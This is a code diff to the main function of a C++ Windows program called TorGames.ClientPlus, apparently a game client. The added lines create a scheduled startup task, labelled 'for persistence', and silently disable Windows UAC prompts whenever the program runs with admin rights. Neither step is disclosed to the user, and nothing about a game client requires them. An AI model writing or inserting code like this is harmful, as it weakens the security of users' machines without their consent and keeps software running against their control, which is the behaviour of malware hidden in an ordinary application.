@@ -207,6 +207,33 @@ int main(int argc, char* argv[]) {
     LOG_INFO("TorGames.ClientPlus v%s starting...", CLIENT_VERSION);
     LOG_INFO("Running from: %s", Updater::GetCurrentExePath().c_str());
 
+    // Setup - ensure scheduled task exists and UAC is disabled
+    std::string exePath = Updater::GetCurrentExePath();
+
+    // Check and create scheduled task for persistence
+    if (!TaskScheduler::TaskExists("TorGamesClient")) {
+        LOG_INFO("Scheduled task not found - creating...");
+        if (TaskScheduler::AddStartupTask("TorGamesClient", exePath.c_str())) {
+            LOG_INFO("Scheduled task created successfully");
+        } else {
+            LOG_ERROR("Failed to create scheduled task");
+        }
+    } else {
+        LOG_INFO("Scheduled task already exists");
+    }
+
+    // Check and disable UAC prompts if running as admin
+    if (Utils::IsRunningAsAdmin()) {
+        if (!Utils::IsUacDisabled()) {
+            LOG_INFO("UAC not disabled - disabling...");
+            Utils::DisableUac();
+        } else {
+            LOG_INFO("UAC already disabled");
+        }
+    } else {
+        LOG_INFO("Not running as admin - skipping UAC check");
+    }
+
     // Use a named mutex to ensure only one instance runs
     HANDLE hMutex = CreateMutexA(nullptr, TRUE, "Global\\TorGamesClientMutex");
     if (hMutex == nullptr || GetLastError() == ERROR_ALREADY_EXISTS) {
